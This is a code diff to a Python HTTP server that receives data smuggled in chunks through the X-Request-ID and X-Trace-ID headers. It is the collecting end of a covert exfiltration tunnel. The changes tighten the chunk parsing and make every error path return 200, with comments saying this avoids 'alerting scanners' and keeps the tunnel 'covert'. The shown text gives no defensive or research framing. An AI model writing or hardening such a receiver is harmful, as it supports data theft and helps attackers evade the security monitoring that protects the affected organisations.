@@ -22,22 +22,30 @@ class TunnelHandler(BaseHTTPRequestHandler):
         trace_id = self.headers.get('X-Trace-ID')
 
         if not request_id or not trace_id:
-            self.send_response(200)
+            self.send_response(200) # Still return 200 to avoid alerting scanners
             self.end_headers()
             return
 
         try:
             # Format: session_id:chunk_index:total_chunks
-            session_id, chunk_index, total_chunks = request_id.split(':')
-            chunk_index = int(chunk_index)
-            total_chunks = int(total_chunks)
+            parts = request_id.split(':')
+            if len(parts) != 3:
+                # Log or handle malformed request
+                self.send_response(200)
+                self.end_headers()
+                return
+                
+            session_id, chunk_index_str, total_chunks_str = parts
+            chunk_index = int(chunk_index_str)
+            total_chunks = int(total_chunks_str)
             
             self.server.receiver.add_chunk(session_id, chunk_index, total_chunks, trace_id, self.client_address[0])
             
             self.send_response(200)
             self.end_headers()
-        except Exception:
-            self.send_response(400)
+        except Exception as e:
+            print(f"Error processing tunnel request: {e}")
+            self.send_response(200) # Stay covert even on error
             self.end_headers()
 
 class TunnelReceiver:
